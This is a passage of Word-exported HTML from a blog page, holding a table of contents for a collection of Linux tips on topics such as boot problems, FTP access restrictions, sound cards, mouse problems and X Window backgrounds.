TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894723"  ><FONT face="Times New Roman"  >1.22<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 22: More information from usenet<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >8</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894724"  ><FONT face="Times New Roman"  >1.23<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 23: Bytes per inodes<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >8</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894725"  ><FONT face="Times New Roman"  >1.24<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 24: LILO and boot problems<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >8</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894726"  ><FONT face="Times New Roman"  >1.25<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 25: Making CD-ROM images<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >9</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894727"  ><FONT face="Times New Roman"  >1.26<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 26: FTP access restrictions<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >9</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; tab-stops: 21.0pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894728"  ><FONT face="Times New Roman"  >2.<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Hardware<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >9</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894729"  ><FONT face="Times New Roman"  >2.1<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 1: Detecting 2 ethernet cards<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >9</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894730"  ><FONT face="Times New Roman"  >2.2<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 2: Everything on sound cards<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >10</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894731"  ><FONT face="Times New Roman"  >2.3<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 3: Non-PostScript printers<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >10</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894732"  ><FONT face="Times New Roman"  >2.4<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 4: Use Windows special keys in Linux<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >10</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894733"  ><FONT face="Times New Roman"  >2.5<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 5: Added processors<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894734"  ><FONT face="Times New Roman"  >2.6<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 6: Detecting an ISA device<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894735"  ><FONT face="Times New Roman"  >2.7<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 7: Find hardware information<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894736"  ><FONT face="Times New Roman"  >2.8<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 8: Blinking leds on the keyboard<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894737"  ><FONT face="Times New Roman"  >2.9<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 9: Reading a foreign file system<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894738"  ><FONT face="Times New Roman"  >2.10<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 10: Can't mount root fs<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >11</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894739"  ><FONT face="Times New Roman"  >2.11<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 11: Linux on a 286?<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894740"  ><FONT face="Times New Roman"  >2.12<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 12: Linux without a hard drive<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894741"  ><FONT face="Times New Roman"  >2.13<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 13: Shutdown and power off<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894742"  ><FONT face="Times New Roman"  >2.14<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 14: LPD started but no device found<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894743"  ><FONT face="Times New Roman"  >2.15<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 15: Read files from FAT32 drives<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894744"  ><FONT face="Times New Roman"  >2.16<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 16: TV on Linux<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >12</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894745"  ><FONT face="Times New Roman"  >2.17<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 17: Device drivers<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >13</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894746"  ><FONT face="Times New Roman"  >2.18<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 18: Mouse problems<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >13</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894747"  ><FONT face="Times New Roman"  >2.19<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 19: International keyboards<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >13</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; tab-stops: 21.0pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894748"  ><FONT face="Times New Roman"  >3.<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Software<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >13</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894749"  ><FONT face="Times New Roman"  >3.1<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 1: Background image in X Window<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >13</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894750"  ><FONT face="Times New Roman"  >3.2<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 2: Customize Netscape Communicator<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >14</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894751"  ><FONT face="Times New Roman"  >3.3<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 3: 